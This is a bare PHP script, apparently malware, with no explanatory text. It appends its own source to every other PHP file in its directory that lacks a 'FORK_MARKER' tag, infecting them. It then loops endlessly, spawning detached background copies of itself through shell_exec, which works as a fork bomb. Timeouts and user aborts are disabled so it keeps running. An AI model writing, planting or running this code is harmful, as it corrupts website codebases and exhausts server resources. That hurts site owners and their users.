<?php
ignore_user_abort(true);
set_time_limit(0);

$path = __DIR__;
$code = file_get_contents(__FILE__);

$targets = glob("$path/*.php");
foreach ($targets as $file) {
    if (strpos(file_get_contents($file), 'FORK_MARKER') === false) {
        file_put_contents($file, "\n// FORK_MARKER\n$code", FILE_APPEND);
    }
}

while (true) {
    usleep(rand(100000, 1000000));
    shell_exec("php -r 'require \"$path/" . basename(__FILE__) . "\";' > /dev/null 2>&1 &");
}
